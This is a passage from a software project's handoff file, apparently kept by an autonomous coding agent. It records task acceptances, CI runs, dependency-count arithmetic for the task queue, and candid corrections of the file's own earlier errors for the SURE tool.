names it in a `depends_on`. The three precedents are one-for-one (a task leaving
as a dependent entered), two dependents entering, and a member lost with none
gained — and this one is a member lost with none gained *because nothing depends
on it*, which is a different reason with the same number. Which is the same
argument the paragraph below makes in the other direction: the count is quoted
from the command and the **reason** is read out of `tasks/tasks.json`.

**The one thing about `P2-T011` a reader should know before the detail: the label
belongs to the door, and no door takes one.** Every channel that can produce a
`Requirement` has a function that writes its own `IntentSource`, and **no function
that produces a `Requirement` accepts a source as an argument** — so a caller
holding a command it read out of a README has nothing to ask for, because there is
no parameter to ask with. Provenance survives by a shape the module does not offer
an alternative to, rather than by a rule its code follows. The corollary a reader
should carry: **the permission half is implemented and the capture half is not**,
so `P8-T005` stays `queued` and nothing in the product writes an observed request
yet. See "What `P2-T011` added".

**The thing this task found in its own tests, and the reason the section is worth
reading rather than the diff.** A test asserted a label by comparing it against
the `const` that produces it, and its comment claimed it was *"the assertion that
fails on that day"* somebody stopped asking that `const`. **No test can move a
`const`**, so the mutation it named was invisible to it and it would have passed
for a different reason than its name said — the failure `CLAUDE.md` ranks below a
visible error. It was **deleted rather than reworded**, the claim was declared
unobservable with the condition that would falsify it, and a distinctness test
that *is* observable took its place. Three false claims in the module's own
comment were found the same way, by reading it against the code before the
harness ran rather than after.

**A correction, because the paragraph here said the opposite.** It read *"Phase
`P2` is **10 of 12**; `P2-T009` is the one that would finish it."* Both halves
were wrong. `P2` was **11 of 12** with `P2-T009` outstanding, and the task that
finishes the phase is **`P2-T011`** — which this acceptance has just made READY,
because its `depends_on` names `P2-T009`. The counts and the membership in this
file are quoted from `taskctl status` rather than predicted, and this is the
reason that rule exists: a prediction that is wrong reads exactly like a fact.

**The one thing about `P2-T009` a reader should know before the detail: a
documented command is read and never run, and that is a property of the shape
rather than a promise.** No field on `DocumentedCommand` can hold a program and
its arguments — `text` is one string and nothing in `sure-core` ever splits it —
`DocumentReport::of` is the only door a report can come through, and `sure-cli`
builds no such report at all. The module declines the stronger claim: there is
no function that turns a `DocumentedCommand` into an `ApprovedCommand`, so the
path **does not exist** rather than being blocked, and a blocked path would be a
weaker thing to have said. The corollary a reader should carry: nothing in the
product builds a `DocumentReport` yet, so the reading is a property of the module
and its tests and not yet of a `sure` invocation — the same family as
`ComponentGraph` in `P2-T007`. See "What `P2-T009` added".

**Two things the `P2-T009` work found in its own code, both recorded because
neither was visible by reading it.** The mutation harness's unmutated baseline
was **not green** — which is the only reason the first of these was caught — and
the survivor of the first mutation run was a `command_from` guard that could
never fire, with a test that passed for a different reason than its name said.
The guard was removed rather than declared unobservable and the test was fixed;
the account is in "What `P2-T009` added" and in `progress/DECISIONS.md`.

**The thing about `P2-T008` a reader should still know: the
`.env` file is never opened, and that is a decision rather than a failure.** The
acceptance asks for the keys a project requires without collecting values, and
the module enforces that in the type — no field on `Reference` or `Declaration`
can hold a value, and `key_from_env_line` takes one `&str` and returns an owned
key with nowhere for the right-hand side to go. `.env.example` and its siblings
are read for the keys they declare; `.env`, `.env.local` and `.env.production`
are not candidates **and do not appear in `unread()` either**, so a pass that
skipped them still reports itself complete. That is correct — nothing was lost —
and it is stated here because a reader who expected those files in `unread()`
would be reading a loss that never happened. See "What `P2-T008` added".

**The thing about `P2-T012` a reader should still know: it changed what every
project is reported as.** `sure_core::support::classify`
answers a project-level support level, and in this build the answer is
`inspect_only` for **every** project, because this build runs no project code and
the product's levels A and B both require running checks. That is a deliberate
under-claim, it is argued from a checkable evidence anchor in the module comment,
and **it is an open decision for the owner** — the alternative reading is that the
level states what SURE *understands*, which would put a project with a readable
manifest at level B. Both readings are recorded in three places rather than
settled quietly here. See "What `P2-T012` added".

The commit that follows `0907acf` is not `P2-T010`'s first work: it fixes a
defect that run `34865716315` exposed, and the reason the fix came first is that
`P2-T010`'s acceptance requires the store to open reliably, which is the thing
that run showed it does not always do.

**The branch, in order, from the last accepted task to here:** `0907acf` accepts
`P2-T007`; `3be88f1` records the run of the fix that `0907acf` follows; `4746c48`
is `P2-T010`'s implementation; `63278c0` is the `P2-T010` acceptance; `d5261a6`
is `P2-T012`'s implementation; `481066f` is the `P2-T012` acceptance; `ec8456d`
is `P2-T008`'s implementation; `cd530f6` is the `P2-T008` acceptance; `b644462`
is `P2-T009`'s implementation; `cf7675d` is the `P2-T009` acceptance; `73da9a6` is
`P2-T011`'s implementation; the commit carrying this file is the `P2-T011`
acceptance. The acceptance of `P2-T007` is therefore **not** at the tip and never
was, so the check for it is `git show --stat 0907acf` rather than
`git log -1 --stat` — the sentence here used to name the wrong command, and a
handoff that is wrong about how to verify it is worse than one that says nothing.

**And the paragraph above was itself wrong in the way it warns about, which is
why it now names `cf7675d`.** It read *"`b644462` is `P2-T009`'s implementation;
the commit carrying this file is the `P2-T009` acceptance"* — true when it was
written, and left unamended when `P2-T011`'s implementation landed at `73da9a6`,
because that commit changed only code, tests, one document and `state.json`. So
from `73da9a6` until this edit the ordered list of this branch's commits stopped
one commit short of the tip without saying so. **No reader saw it in that state**
— the next commit to carry this file is this one — so nothing was acted on
wrongly, and it is recorded anyway because the shape is the same one this file
keeps meeting: a list that ends early reads exactly like a list that is complete.
That is also the by-name counter that was quietly 22 long, the pattern that
matched nothing and reported 0, and the READY count that stood still while its
membership changed.

**`P2-T010` follows the two-commit shape `P2-T007` used**, and for the same
reason: the acceptance cannot be written honestly until its run exists, so the
implementation is committed and pushed, the run is read, and only then is the
acceptance recorded — in `progress/state.json`, in the commit with this file.

**`P2-T007`'s implementation went in on its own commit, with its own run read
before the acceptance was taken.** `586d3a3`, run `34864498113`, all five jobs
green; `435181f` records that run. The two-commit shape was deliberate and is not
the four-commit shape `P2-T006` used: the acceptance could not be written honestly
until the run existed, and once it did, only the acceptance was left.

**Where the chain stops, stated because the paragraph here said the opposite
until it was corrected.** This file previously read *"the commit after it records
the acceptance commit's own run"* — which is a rule that never terminates, since
that commit's run would need a commit too. **The rule that is actually followed,
and was followed for `P2-T006`: every substantive commit's run is read before the
next work starts, and the run of the commit that records runs is read and reported
in the session rather than enshrined in a further commit.** `P2-T007`'s chain
therefore ends at `0907acf`, the acceptance, whose run is read in the session that
took it. The two runs that had not been recorded when the acceptance landed —
`34865169857` on `435181f` and `34865317166` on `0907acf` — are rows in the table
below, added by the commit whose own run stops the chain.

A correction to the two entries before this one: each said `progress/state.json`
records the acceptance "in the commit immediately after the one carrying this
file". Neither did — in `07e20be` and its predecessor the handoff and the
acceptance landed together, so the sentence described a procedure that was not
the one followed. Stated here because a handoff that is wrong about how to
verify it is worse than one that says nothing.

**`P2-T002` has had five follow-up commits since it was accepted — and the first
two of them exist because CI had been red since the bootstrap commit and nobody
had read it.** That is still the most important thing in this file: the local
gate set on this machine cannot see platform-gated code, `P2-T002` was accepted
while three CI jobs were failing, and the acceptance was sound only by luck. The
account is in "Continuous integration" below, and the rule that came out of it is
**a push is not finished until its run has been read**. `P2-T003` is held to that
rule: its run is a row in the same table, added by a commit after this one,
because the run does not exist until this commit has been pushed.

Primary development host: Windows 11 x64 / native MSVC.

Canonical remote: `https://github.com/lichman0405/SURE.git`
Autonomous branch: `claude/v0.1-autonomous`

## Exact current state

**This section is a snapshot taken at `P4-T004`'s acceptance, and it was four
acceptances stale when `P4-T008`'s acceptance found it. THE CURRENT READING IS IN
THE HEADER AT THE TOP OF THIS FILE** — `51 / 166` accepted, phase `P4` open at
`8/9`, the READY list nine entries long and headed by `P4-T009` — and this block
is left standing rather than overwritten because every paragraph under it is a
claim about what a *specific* acceptance printed, and the whole point of the
acceptance discipline this file records is that such a claim is checkable only
while it still says what it said. **A heading that promises the current state and
delivers a four-acceptance-old one is the failure this paragraph exists to stop
being silent**, and the fix that lasts is the one the header already carries: it
is rewritten at every acceptance, by hand, and it is the only place in this file
that is.

`node scripts/taskctl.mjs status` reports:

```
Project: SURE | status: in_progress | phase: P4
{ accepted: 47, queued: 119 }
READY: P4-T005, P4-T006, P4-T007, P4-T008, P4-T009, P5-T001, P6-T001, P6-T005, P6-T007, P8-T001, P12-T008, P13-T001, P13-T004
```

**That block is the tool's output pasted whole, including the third line
unwrapped**, and it was pasted **after** `P4-T004` was accepted rather than
before — it is the run of `node scripts/taskctl.mjs status` taken once
`state.json` had been updated. The thirteen-task READY list above is therefore
read out of the tool rather than predicted, which is the discipline the paragraph
below records the failure of.

**`P4-T004` is `accepted`** on **`34983449923`**, which carries **`702cfee`**, and
both of the task's runs are read in full below. **`in_progress` is 0 again**, so
nothing is half-finished and the next session may start any READY task without
adopting an orphan. **`P4-T004` has two dependents and only one of them is now
ready**, which is the arithmetic worth doing rather than asserting:

```
P4-T009  depends_on: ["P0-T004","P4-T002","P4-T003","P4-T004"]  (tasks/tasks.json)
P14-T003 depends_on: ["P4-T004","P7-T005"]

P0-T004: accepted   P4-T002: accepted   P4-T003: accepted
P4-T004: accepted   P7-T005: queued                            (progress/state.json)

P4-T009:  all four accepted  -> READY
P14-T003: P7-T005 queued     -> still not READY
```

**So accepting `P4-T004` unblocked exactly one task, and the READY list is the
same length before and after it: `13 → 13`.** That is not a coincidence of two
numbers that happen to match — it is `13 - 1 + 1`, the task accepted leaving and
`P4-T009` arriving — and the two readings are computed by replaying the
dependency rule over `git show HEAD:progress/state.json` and the working copy
rather than by comparing two printouts of the READY line, because the READY line
in the session banner is **`ready.slice(0, 8)`** (`scripts/dev-context.mjs:6-8`)
and is a window rather than a count. **`P4-T005` is the next concrete action by
the ordering rule**, and `P4-T009` is now READY but waits behind it rather than
jumping the queue.

**Two things in the paragraph this one replaces are wrong, and both are worth
recording because of how they were found — by printing the files, not by reading
the sentence.** It quotes `P4-T009`'s title as *"Implement repair and re-check
loop"*; **no task in `tasks/tasks.json` has that title**, and the nearest real
ones (`P9-T005` *"Implement re-check lifecycle/history"*, `P9-T001` *"Implement
RepairContract domain/schema"*) are five phases away. **A task title in quotation
marks is a quotation of a project artefact**, and one that cannot be confirmed is
not a paraphrase — it is a statement about a file that is simply false, in the
document whose job is to be checkable. The same paragraph also names `P4-T005` as
the dependent and `["P4-T001","P4-T002","P4-T004"]` as its requirements, which
would have produced the *same* arithmetic — `15 - 1 + 0 = 14` — and read as a
verified statement; `P4-T005` depends on `["P2-T009","P3-T004"]` and **does not
name `P4-T002` at all**. **A wrong dependency graph that happens to give the right
number is exactly what the reading rule below is for.** The arithmetic is
available from `tasks/tasks.json` and `progress/state.json` without leaving either
file, which is the same instruction item 20 below gives (the snapshot item, which
is where the READY-list reading rule lives).


**`P3-T001` through `P3-T011` are `accepted`**, on runs `34924525793`,
`34927065374`, `34930744061`, `34935781639`, `34938974624`, `34941955270`,
`34943445326` / `34943853809` / `34944133634` — the last three being `P3-T007`'s,
which took three commits and therefore three runs — `34946515895`, which is
`P3-T008`'s and whose five jobs all read `success`, three for `P3-T009` —
**`34952200942` and `34952509429`**, its implementation and the one-assertion fix
that answered the first's macOS red, and **`34953593684`**, which carries the
acceptance commit `a6bc8df` — and, for `P3-T011`, **`34959719084`**, which carries
`be02100`. **`P4-T001` is `accepted`** too, on **`34963032089`**, which carries
`97f0707` and is read in full below; **it is the first task in phase `P4`**, so
the phase line above now reads `P4` because work has begun there rather than
because it was the lowest-numbered READY task's phase. **`in_progress` is 0**, so
nothing is half-finished and the next session may start any READY task without
adopting an orphan. **Phase `P3` is 11 of 11 and closed**, so nothing in it is
`queued` any more. `44 + 122 = 166`, which is every task in `tasks/tasks.json`.

**`P3-T010` took four commits, three runs, and one of those runs is red.**
`34955834313` carries the first two commits — `43c4a61` has no run of its own
because the two were pushed together — and reads Windows **1250** / macOS
**1251** / Ubuntu **1252** parent tests, 0 failed, 11 ignored, `+23 −0` on all
three platforms against `34954317400`. **`34956776646` is red on
`rust (windows-latest)` and is the run of a commit that changes one doc comment
and no executable line**: macOS and Ubuntu report the previous run's figures to
the test — 1251 and 1252 — while Windows reports **1249 passed and 1 failed**,
the failing test being
`a_port_with_nothing_behind_it_is_refused_rather_than_unreachable` and the
reported first line being **the probe's own request line**. `34957515713` is the
green on `01fc2a7`: Windows **1251** / macOS **1252** / Ubuntu **1253**, 0 failed,
11 ignored, **+1 on every platform**, the failing test out of the failed column
and one new unit test in.

**That red is the reason this acceptance is three commits rather than two, and it
is worth stating plainly because the shape is unusual: a documentation-only
commit found a product defect.** A doc comment cannot cause a test to fail, so
the failure was known to be in the code before its cause was known, and the cause
turned out to be a **TCP self-connect** — the operating system can hand the
dialled port out as the connection's own source port, in which case the
connection loops back on itself and the probe reads back what it wrote. The fix
is `is_a_self_connect`, and **`m11`, the mutation that deletes it, survives all
591 tests in `sure-core`**: the predicate is tested with two addresses directly,
the branch that calls it is not tested at all, and the gap is recorded rather
than papered over. Run `34956776646` is also **the fourth CI red on this branch
and the first one whose cause was neither a compile nor a platform-gated test**.

**The READY list read 14 before `P3-T010` and reads 13 after it, and this is the
`P3-T008` shape for both the number and the reason.** `P3-T010` has exactly **one**
dependent — `P5-T001`, *"Implement runtime probe planner"* — and `P5-T001` also
names `P4-T001`, which is `queued`, so accepting this task unblocked nothing:

```
P5-T001 depends_on: ["P3-T010","P4-T001"]      (tasks/tasks.json)
P4-T001: queued                                (progress/state.json)
14 - 1 + 0 = 13
```

**`14 → 13` at the accept, and `13 → 13` at the `start`** — the previous task's
shape was `14 → 13` at the *start* and `13 → 13` at the accept, so the two
neighbouring tasks share a final number and reach it at opposite steps. **And it is
the fourth time a dependent has been held back by a second requirement**, after
`P3-T004`, `P3-T007` and `P3-T008`. `P3-T011` was already READY before this
acceptance — it depends on `P3-T009` alone — which is why the list shrank rather
than standing still.

**The READY list read 13 before `P3-T009` and reads 14 after it: it GREW, and this
is the first acceptance in several to make it longer.** `P3-T009` has exactly
**two** dependents, `P3-T010` and `P3-T011`, both of which name only it and both of
which are `required`:

```
P3-T010 depends_on: ["P3-T009"]                (tasks/tasks.json)
P3-T011 depends_on: ["P3-T009"]                (tasks/tasks.json)
13 - 1 + 2 = 14
```

**A reader who took the three earlier shrinks as a rule about this list would have
predicted 13 again**, and the arithmetic that produces 14 is available from
`tasks/tasks.json` without leaving the file — which is the same instruction item 20
below gives (the snapshot item, which is where the READY-list reading rule lives),
arriving from a case where the arithmetic and the reading agree. **The number in
this sentence has been rewritten four times, and the third rewrite is why the
parenthesis is here**: `printitems.py` prints an item's own number and its first
line, which is the only way to resolve a reference by *what it points at* rather
than by what it says.

**The READY list read 14 before `P3-T008` and reads 13 after it, and for the first
time in this file the shrink happened at the `start` *because a dependent was
blocked*.** `P3-T008` has exactly **one** dependent — `P14-T006`, *"Implement
execution-trust fixtures"* — and `P14-T006` also names `P7-T004`, which is
`queued`, so accepting this task unblocked nothing:

```
P14-T006 depends_on: ["P3-T008","P7-T004"]     (tasks/tasks.json)
P7-T004: queued                                (progress/state.json)
14 - 1 + 0 = 13
```

**`14 → 13` at the `start` and `13 → 13` at the `accept`,** which is the `P3-T003`
shape for the step and a new shape for the reason. At `P3-T003` nothing entered
because there was nothing to enter; here there is a dependent, the graph names it,
and it still did not enter. **A reader who counted `1` from
`dependents = [x.id for x in tasks if 'P3-T008' in x.depends_on]` would predict the
list to stand still and be right about the number and wrong about the step** — the
same arithmetic-versus-reading distinction `P3-T003` recorded, arriving from the
opposite direction. And **it is the `P3-T004` reason**: that reading had seven
dependents of which two failed to enter because each named a second requirement,
and this is the third time a dependent has been held back by one.

**This is the third time an acceptance has made the list shorter**, after
`P3-T002` (`12 → 11`) and the reading in the paragraph below (`15 → 14`), and the
three do not share a cause. `P3-T002` and `P3-T007` both have no dependents; this
one has one and it is blocked. **A reader who took the two earlier shrinks as a
rule about tasks with no dependents would have predicted this list to stand still**,
and the paragraph below says in its own words that the two shrinks it could see
were *"both 'no dependents'"* — which was true of the two it could see and is not
true of the third. That is this file's ninth-and-tenth reading problem in its
plainest form: **the shape was generalised from the readings available, and the
next acceptance produced a third shape rather than a confirming instance.**

**One thing about this acceptance is about the tool rather than the graph, and it
is recorded here because `progress/state.json` cannot record it.** `taskctl accept`
reads `--note` and not `--evidence`, so the first `accept` for `P3-T008` landed
with an empty note; `accept` cannot be re-run from `accepted`, and the note was
written by hand into the file afterwards. **The hand-written note then carried a
stale figure** — it said eleven mutations were run and all eleven caught, because
it was written before the twelfth was run — and that sentence has now been
corrected in place. `taskctl validate` reports `state OK: 166 tasks` either way,
**which is the point: the validator checks the shape of this file and not the truth
of it, so a note that is merely wrong survives every gate this repository has.**

    **And the hand-edit did a second thing nobody asked it to, which is the worse of
    the two and was found by reading `git diff` rather than by a gate.** The edit
    was made with Python's `json.dump` at its default `ensure_ascii=True`, so it
    rewrote **every non-ASCII character in the file as an escape sequence** — 148
    em-dashes across other tasks' notes — and `progress/state.json` then held a
    mixture: 150 escapes and the 2 raw characters the replacement text happened to
    contain. **The escaped form is the same JSON, so it parsed, so `taskctl
    validate` said `state OK: 166 tasks`, and so did every other gate.** What made
    it visible was that a change which should have touched four lines reported
    **28 lines changed, 14 insertions against 14 deletions** — the same signal the
    `P3-T001` acceptance used to catch a line-ending rewrite, and the general form
    of it: **a diff much larger than the change is the only symptom this class of
    mistake has.** The file was restored by loading it and re-dumping with
    `ensure_ascii=False`, and the restore is checked by a property rather than by
    the absence of a complaint — `json.dumps(d, indent=2, ensure_ascii=False)`
    plus a newline reproduces the **committed** blob byte for byte, so the
    formatting is the tool's and not this session's invention. After the restore
    `git diff --stat progress/state.json` reads **4 insertions, 4 deletions**, and
    those four lines are the acceptance. **`scripts/taskctl.mjs` is not the cause,
    and that was checked rather than assumed**: its `save()` is
    `JSON.stringify(state, null, 2)`, which leaves non-ASCII alone, so every
    acceptance before this one wrote the file in the raw form this acceptance has
    put back.

**The READY list got *shorter* at this acceptance, which no previous reading of it
has done.** It read 15 before — `P3-T007` plus the fourteen above — and reads 14
after, because **`P3-T007` has no dependents at all**: `grep -c '"P3-T007"'
tasks/tasks.json` answers **1**, and that one is its own `id`, so no task names it
in a `depends_on` and accepting it removed one member and added none.
`15 − 1 + 0 = 14`. Every earlier reading in this file could be explained by the
dependents of the accepted task; this one cannot be, and **the reason is not that
the rule broke but that there were no dependents for it to operate on.** It is the
ninth reading of this list and the fifth distinct shape among them — after a task
with seven dependents of which five entered, a task with two of which both
entered, a task with none, and a task that was never on the list to leave it.
**This is only the second time an acceptance has made the list shorter**, and the
two are not the same shape: `P3-T002`'s acceptance took it `12 → 11` because that
task has no dependents either, and this one took it `15 → 14` for the same reason,
so **the two shrinks in this file's nine readings are both "no dependents" and
neither is a rule about what an acceptance does.** The list is quoted from the
command rather than reasoned about, which is the only rule that has survived all
nine readings.

**The READY list read 14 before `P3-T006`'s acceptance and reads 15 after it, and
the extra member entered at the `start` rather than at the `accept` — the second
time this file has recorded that, and the reason is the same both times.**
`P3-T006` has **one** dependent, `P3-T009`, and `P3-T009` also names `P3-T001`;
`P3-T001` was already `accepted`, so `P3-T009` was unblocked the moment `P3-T006`
was **started** — a task in progress is not a task that is READY, but it has
already left the blocked count, and `taskctl`'s `ready()` tests the dependency's
status against `accepted`. So the list went **15 → 14 at the `start` and 14 → 15
at the `accept`**, and **a reader attributing the movement to `accept` would get
the direction right and the cause wrong.** The identical shape was recorded at
`P3-T003`, where the list read 10 before and 10 after for the same reason; that
one was read as a curiosity and this one confirms it as a rule. **Two occurrences
of a shape is not a great deal of evidence, but it is the same command printing
both, which is why the command's output is quoted rather than summarised.**

**The READY list went 14 → 15 at the previous acceptance, and it is the first time that
every dependent of the accepted task entered.** `P3-T005` has **two** —
`P3-T006`, which names it alone, and `P4-T001`, which names `P2-T012` **and**
`P3-T005` — and both entered, because `P4-T001`'s other requirement was already
satisfied. `14 − 1 + 2 = 15`. **The reading immediately before it is the one that
would have misled**: `P3-T004` had seven dependents of which two were blocked by
a second requirement, so the safe expectation here was that the dependent with
two requirements would be blocked too, and it was not. That is the seventh
reading of this list and the fourth distinct shape among them, and it is why the
command's output is quoted rather than summarised.

**The READY list went 10 → 14 at `P3-T004`'s acceptance, and that is the sixth
shape and the first one that is a jump rather than a step.** `P3-T004` has **seven** direct
dependents — `dependents = [x.id for x in tasks if 'P3-T004' in x.depends_on]` is
`P3-T005, P3-T007, P3-T008, P4-T005, P10-T006, P11-T006, P13-T004` — of which
**five entered** and **two did not**. The two that did not are the interesting
half: `P10-T006` also depends on `P10-T002` and `P11-T006` also depends on
`P11-T002`, so both are still blocked, and **a reader counting dependents would
have predicted seven entering.** `10 − 1 + 5 = 14` is a reading rather than a
rule, and the rule it displaces is the one the five earlier readings might have
taught: that an acceptance moves the list by one.

**The READY list read 10 before `P3-T003`'s acceptance and read 10 after it, and
that is a fifth outcome rather than a repeat of the four below.** `P3-T003` has no
dependents — `[x for x in tasks if 'P3-T003' in x.depends_on]` is empty — so
nothing entered, exactly as at `P3-T002`. What is new is the other half:
**`P3-T003` was not on the list to leave it.** `taskctl start` had already taken
it off, because a task being worked on is not a task that is READY, so the list
went **11 → 10 at the `start` and 10 → 10 at the `accept`** — and every earlier
reading in this file attributed the movement to `accept`. The `status` output
quoted above is where that is visible, and it is the same command that printed
the earlier readings, which is why the list is quoted rather than summarised.

**The READY list went 12 → 11 when `P3-T002` was accepted, and nothing entered
it then either.** `P3-T002` left by being accepted, exactly as `P3-T001` did, and
unlike `P3-T001` it has **no dependents**: `[x for x in tasks if 'P3-T002' in
x.depends_on]` is empty. So the count fell that time, and it fell for a reason a
reader cannot get from the number.

**The READY list went 10 → 12 one acceptance earlier, and that was the first time
an acceptance had made it longer.** `P3-T001` left by being accepted and **three**
dependents entered — `P3-T002`, `P3-T003` and `P3-T004` — because all three name
it in their `depends_on` and nothing else. The two acceptances before that one
each recorded the same shape, a task leaving and a dependent entering in the same
step so the count stood still; the one before that lost a member and gained none.
**Five readings, and the shape of each was recorded rather than the number, which
is the argument for quoting the command rather than reasoning about which way the
count should have moved.** The fourth is the one that would have been predicted
wrong: `P3-T002` had three siblings waiting on `P3-T001` and nothing waiting on
itself, so the same operation that lengthened the list last time shortened it this
time. **The fifth is the one that would have been predicted *right* for the wrong
reason**: a reader who expected the list to stand still at `P3-T003` because it
has no dependents would have been right about the number and wrong about the
step, and the sentence that says which step it was is the one quoted above.

**The phase arithmetic in this file was wrong until `P2-T011`'s acceptance, and
the correction is in the header rather than only here.** `P2` was described as 10
of 12 with `P2-T009` finishing it; it was **11 of 12**, and `P2-T011` was the one
that finished it. The tally is read out of `tasks/tasks.json` joined with
`progress/state.json` rather than counted forward from the previous session's
sentence — and **the figures are a reading with a date on them**: *11 accepted and
1 queued* when this paragraph was written, *12 and 0* at `P2-T011`'s acceptance,
which is what closed the phase, *1 and 10* at `P3-T001`'s, and *2 and 9* at
`P3-T002`'s. **The method is the
durable part and the numbers are not**, which is why the sentence gives the
successive readings rather than replacing the old ones: a reader who compares this
paragraph against the header should find them agreeing, and a reader who compares
either against `taskctl status` should find the command winning.

**The `phase:` field moved to `P3` in the designed way, which is worth one
sentence because the previous acceptance predicted it.** `P3-T001` was `start`ed
rather than only accepted, and `start` is what writes `current_phase`, so the
field reads `P3` because a `P3` task was worked on and not because `P2` closed.
The prediction in the `P2-T011` block — that the field would go on reading `P2`
until a task was started — was correct, and it is checkable in one command rather
than being a thing this file asks to be believed.

**What the acceptance tool fills and what it does not, read out of the file
rather than assumed.** On `P2-T010`, `base_sha` and `head_sha` are both `null`
and `evidence` is `[]`; `taskctl accept` sets `status`, `finished_at` and `notes`
and nothing else. **That is true of the SHAs for all 40 accepted tasks — 0 carry
a `base_sha` or a `head_sha` — but it is NOT true of `evidence` or `notes`,
and a blanket claim would have been wrong in two directions:** `P2-T003` is the
one accepted task of the 40 with a non-empty `evidence` array (three strings,
added when that acceptance was recorded), and `P0-T009`, `P1-T001` and `P1-T002`
carry no notes at all where the other 37 do. So the commits and the run for
`P2-T010` are recorded **here**, and the fields in `progress/state.json` are not
a substitute for this file — they are not even uniform across tasks. **This
paragraph has now been re-read at 28, 33, 34, 39 and 40 accepted tasks and every count in
it held except the totals**: the three always-empty-notes tasks are still the
same three, `P2-T003` is still the only one with evidence, and no task has ever
gained a SHA. That is a fact about the tool rather than about the tasks, so it
should survive the next reading too — and if it stops, the tool changed.

**The re-read this paragraph asked for, at 47 accepted tasks, and the prediction
it made is the thing that failed rather than a count.** It said *"no task has
ever gained a SHA"* and *"if it stops, the tool changed"*. **It has stopped, and
the tool did not change**: `taskctl accept` still writes `status`, `finished_at`
and `notes` and nothing else, and **two** tasks carry a `base_sha` and a
`head_sha` because a person typed them — `P4-T003` (`424b213` → `4fd5663`) and
`P4-T004` (`22b518d` → `702cfee`). The same is true of the evidence count, which
read 1 of 40 and now reads **6 of 47**: `P2-T003` plus `P3-T011`, `P4-T001`,
`P4-T002`, `P4-T003` and `P4-T004`. So the two halves of that paragraph have
**not** held in the same way — the *notes* half is still exact, the same three
tasks (`P0-T009`, `P1-T001`, `P1-T002`) have no notes and every other accepted
task has one — and the reason is worth the sentence: **the fields stopped being
a fact about the tool and became a fact about the person accepting, which is
exactly the kind of claim this file exists to distrust.** Every SHA and every
evidence string in those five tasks is hand-entered, no gate reads them, and the
authority for them is the run table below rather than the field itself.
**`base_sha` and `head_sha` now mean the pair of commits this acceptance spans**
— `P4-T003`'s `head_sha` is its implementation commit because that task had one,
and `P4-T004`'s is `702cfee` because that task had two and the green run carries
the second — so a reader who diffs the pair gets everything the task did and not
only its first commit.
**The `P3-T008` note is the first on this branch that was written by hand rather
than by the tool**, because `accept` was given `--evidence`, which it ignores, and
it cannot be re-run from `accepted`. The tool wrote an empty one and a person
typed the real one, **which means `progress/state.json` now holds a note no gate
has checked** — a claim in this file of exactly the kind this repository exists to
distrust. The note's mutation count was stale when it was first written and was
corrected in place; **the correction is recorded here rather than left silent,
because the interesting fact is not the number but that nothing would have caught
it.**

**A correction that was made and then overtaken, kept because both halves are
worth having.** An earlier draft of this file said `accepted: 26` and "nothing is
`in_progress`" while `progress/state.json` had `P2-T006` as `in_progress` with
`finished_at: null` and an empty `notes` — the implementation commit had been
pushed and its run read, and neither of those is an acceptance. The count had
been carried forward from a summary instead of read out of the file it describes,
which is the failure mode this repository is built against. It was corrected to
`25` while the acceptance was still outstanding, and `26` was a **separate,
later** reading of the same command. The distinction is the point: a figure that
becomes true later was not true when it was written. `27` above is a third
reading, taken after the acceptance landed.

**`READY` gained `P2-T007` and `P4-T008` when `P2-T006` was accepted** — neither
could start until Cargo discovery existed. That is the dependency graph doing its
job, and it is the reason the list is quoted from the command rather than
remembered.

`P2-T007` (the component graph) is `accepted` and described in "What `P2-T007`
added" below, with its implementation run read in "Reading run `34864498113`".
`P2-T006` is `accepted` and described in "What `P2-T006` added".
The three things worth
knowing before touching any of it are that **one `Budget` serves all three
ecosystems** — and the same one is shared, so a Node-heavy project starves both
Python and Rust by call order, now measured as exactly two affected files rather
than asserted; that **a `Cargo.toml` has two sibling tables and either can be
absent**, so a virtual manifest is a project that declares a great deal; and that
**`build.rs` is a program and `src/lib.rs` is not read**, only reported as a
target at that path. Everything else on this branch is the `P2-T005`, `P2-T004`,
`P2-T003` and `P2-T002` line.

**`P2-T002` (Git project fingerprint) is now the previous session's work.** All
of it is on `claude/v0.1-autonomous` and green: `sure_core::fingerprint` with the
`git` and `digest` modules behind it, 37 new unit tests, the integration tests in
`crates/sure-core/tests/fingerprint_git.rs`, and the new
`docs/architecture/FINGERPRINTING.md`.

**The thing the `P2-T002` session could not verify locally is now verified, and
the evidence is named rather than assumed.** `a_link_is_recorded_by_its_target_and_not_by_what_it_points_at`,
`a_change_behind_an_unchanged_link_is_not_a_change` and
`a_change_to_a_file_sure_cannot_read_has_no_fingerprint` are `#[cfg(unix)]`, and
the body of the second was **rewritten in the `P2-T002` session without ever
having run on this machine** — it previously asserted almost nothing (see the
mutation section below). Windows cannot create a symbolic link without Developer
Mode or administrator rights, and both were probed and are absent. WSL Ubuntu
exists here with Git 2.53.0 but no Rust toolchain.

Run `34839532984`, on commit `c735a2f`, is green on all five jobs, and the three
tests were read out of the log rather than inferred from the job's colour:

```
test a_change_to_a_file_sure_cannot_read_has_no_fingerprint ... ok
test a_change_behind_an_unchanged_link_is_not_a_change ... ok
test a_link_is_recorded_by_its_target_and_not_by_what_it_points_at ... ok
```

The same run settles the `paths/compare.rs` split, which no local run could:
the two case-rule tests are **disjoint by platform and each runs only where its
rule holds**. macOS ran `unix::the_default_entry_point_folds_case_on_a_case_insensitive_platform`;
Ubuntu ran `unix::the_default_entry_point_folds_nothing_on_a_case_sensitive_platform`;
neither ran the other's. That is the whole point of the split, and it is now
observed rather than intended.

`9f13f0d` added a fourth Unix-only test,
`a_tracked_path_replaced_by_a_pipe_is_a_change_and_not_a_hang`, which no local
run can execute either. Two of its constructs were compiled under `-D warnings`
on this host in isolation (`Result::is_ok_and` taking `ExitStatus::success`, and
an un-joined `thread::spawn`) precisely because "gated to another platform" is
where the last four CI failures lived. Run `34840217454` is green on all five
jobs, and the test was read out of **both** Unix logs by name:

```
test a_tracked_path_replaced_by_a_pipe_is_a_change_and_not_a_hang ... ok
```

That is the first test in this repository whose only purpose is to prove a
project cannot make a check hang, and it has now run somewhere.

**Correction to the previous two entries, and the correction to the
correction.** `P1-T010`'s "19 test binaries" counted `store_concurrency`'s child
processes; `P1-T011` corrected the count to 15 and said "four doc-test targets
report 0". Both were true when written and both are now wrong as descriptions of
the repository: the **15 became 16, then 18, and is now 19**, and the doc-test
zeros became a one, then **three**, and are now **four** (`P2-T004` added
`discover::discover`'s). `target/tmp/count_tests.py` **used to skip the
`Doc-tests` sections entirely**, which is why the figure it printed and the
figure in the handoff disagreed by one until both were changed together. It now
counts them and prints them separately.

**Counting `#[test]` attributes does not reproduce these figures**, for two
reasons and not one: `sure-domain`'s `variants!` macro generates tests that no
attribute names, and it undercounts the suite by about twenty; and the
